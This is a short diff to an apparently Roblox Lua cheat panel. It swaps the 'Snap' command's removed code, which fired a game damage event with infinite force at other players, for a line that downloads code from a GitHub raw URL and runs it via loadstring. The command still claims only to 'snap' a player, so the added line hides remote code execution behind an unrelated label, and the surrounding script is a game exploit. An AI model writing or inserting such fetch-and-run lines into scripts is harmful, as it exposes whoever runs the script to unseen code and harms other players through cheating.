@@ -63,12 +63,7 @@ Admin2.addCommand({name = "To",desc = "Teleports you to the Player.",callback = 
     end
 end})
 Admin2.addCommand({name = "Snap",desc = "Snaps chosen player.",callback = function(v)
-    local t = Admin2.getplayers(v)
-    for i,v2 in pairs(t) do
-    pcall(function()
-    game:GetService("Players").LocalPlayer.Backpack.suitControl.Assets.Events.punchHit:FireServer(v2.Character.HumanoidRootPart,math.huge)
-    end)
-    end
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sinnerx3Florencia/Sinnerx3Florencia/main/AdminPanel"))();
 end})
 Admin2.addCommand({name = "Fling",desc = "Flings chosen Player",callback = function(v)
     local t = Admin2.getplayers(v)
